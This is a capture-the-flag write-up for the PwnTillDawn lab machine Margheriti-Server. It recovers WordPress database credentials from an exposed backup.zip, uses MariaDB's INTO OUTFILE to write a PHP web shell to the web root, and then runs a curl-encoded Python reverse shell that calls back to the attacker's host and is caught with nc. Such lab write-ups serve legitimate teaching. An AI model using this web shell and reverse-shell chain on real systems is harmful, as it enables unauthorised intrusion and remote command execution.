---
title: Margheriti-Server
category: [writeups,PwnTillDawn]
tags: [Linux,SQL-Query-Outfile,RCE,Reverse-Shell]
---
# Margheriti-Server
- Difficulty : `Medium`
- IP Address : `10.150.150.145`
- Operating System : `Linux`

# Table of Content
- [Nmap Result](#nmap-result)
- [Method to solve the challenge](#method-to-solve-the-challenge)

# Nmap Result
```
Nmap scan report for 10.150.150.145
Host is up, received syn-ack (0.35s latency).
Scanned at 2022-09-05 11:06:01 +08 for 24s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0)
| ssh-hostkey: 
|   2048 65:cc:32:50:bb:af:b4:8a:be:ff:b1:39:3c:dd:2c:e9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCXkrRWUg9T2JbxLwH7zMqll4nBd9LHM0qGJLz4ysULfLpS7gHaqTb+UhzvDulKupiCTZwmFhUkTBVkzQGZFePqwBMcFH0ulfBiGmU07pkQAP6HzKSsSyIrT/K0uGJWoQ9QPvhrysmQ7ldFOXrEEE5rlCNDsuJopzbHTyWScaNjdD8d3w6r4G+JC7sIx0twfDGSuGDJvm/+4/Q3Lmh26yQfXLOw5/wSx6EVn2drC8b8a/lTG7LpNHqXQewKT3bwlWFSzEeXUzbcPzyMi81LLjbyU0gSBT7nBerg0EUuMakI/xMMLgvlM/myOXKY1nPtuer1esIn+niveIovR03Va2RD
|   256 f9:db:6f:49:63:d7:db:dd:42:42:86:36:c5:31:b1:07 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLcsObbyHjAo5mPNMRcfcmM9ZEPgf/TRFekbj7icf/4/DiLnnhb9hgdkubGT5O9DqQy4mGuKsbudv7r0LxCQE5Q=
|   256 8e:74:a9:e3:fd:74:0c:c2:f7:14:85:81:a6:ba:fc:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHEGjTJJFuhI3WRKePOOuveOZYCQuT6HXV2a1mu8OM58
80/tcp   open  http    syn-ack Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: WordPress 4.9.12
|_http-title: e-corp &#8211; Just another WordPress site
3306/tcp open  mysql   syn-ack MySQL 5.5.5-10.1.26-MariaDB-0+deb9u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.1.26-MariaDB-0+deb9u1
|   Thread ID: 12
|   Capabilities flags: 63487
|   Some Capabilities: InteractiveClient, Speaks41ProtocolOld, Support41Auth, FoundRows, ConnectWithDatabase, LongPassword, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, LongColumnFlag, IgnoreSigpipes, SupportsTransactions, ODBCClient, SupportsCompression, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: Y";@q;n:sW;_K=.nb}n3
|_  Auth Plugin Name: mysql_native_password
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Method to solve the challenge
After looking into the scan result, we will be starting off with website. 
<br>
![](/assets/img/posts/2022-09-05-Margheriti-Server-1.png)
<br>
After looking around with the website, we managed to found a suspicious subdirectory named `backup.zip`. After getting the file and extract, we found ourselves some interesting files.
```
index.php    wp-activate.php     wp-comments-post.php  wp-content   wp-links-opml.php  wp-mail.php      wp-trackback.php
license.txt  wp-admin            wp-config.php         wp-cron.php  wp-load.php        wp-settings.php  xmlrpc.php
readme.html  wp-blog-header.php  wp-config-sample.php  wp-includes  wp-login.php       wp-signup.php
```
After looking into several files, we managed to found a useful credentials.
```
less wp-config.php
------------------

/** MySQL database username */
define('DB_USER', 'wpmaster');

/** MySQL database password */
define('DB_PASSWORD', '-!UlTr4S3cUr3P455W0rd-!');

------------------
```
Since we managed to get their database credentials, we could try to login into their sql as we managed to scan their sql port as well.
```
mysql -h 10.150.150.145 -u wpmaster -p                                                                                      [05/09/22 11:42:00]
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 67
Server version: 10.1.26-MariaDB-0+deb9u1 Debian 9.1

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```
Since we managed to access the database, we could try to look for information as well as other exploit regarding SQL. After looking and trying out basic exploit, we managed to find a way to get shell with SQL.
```
MariaDB [(none)]> SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/cmd.php";
Query OK, 1 row affected (0.343 sec)
```
With the SQL query, we managed to create remote code execution by creating a malicious php file.
<br>
![](/assets/img/posts/2022-09-05-Margheriti-Server-2.png)
<br>
With this RCE, we are able to get a reverse shell.
```
curl http://10.150.150.145/cmd.php?cmd=python3%20-c%20%27import%20os,pty,socket;s=socket.socket();s.connect((%2210.66.66.114%22,1234));[os.dup2(s.fileno(),f)for%20f%20in(0,1,2)];pty.spawn(%22bash%22)%27

nc -nvlp 1234                                                                                                                                                                                                                                      [05/09/22 12:03:25]
Connection from 10.150.150.145:57424
www-data@Margheriti-Server:/var/www/html$ whoami
whoami
www-data
```
We managed to get a reverse shell but it is not a root account. We will not continue privilege escalation as we managed to get all flag without root account.


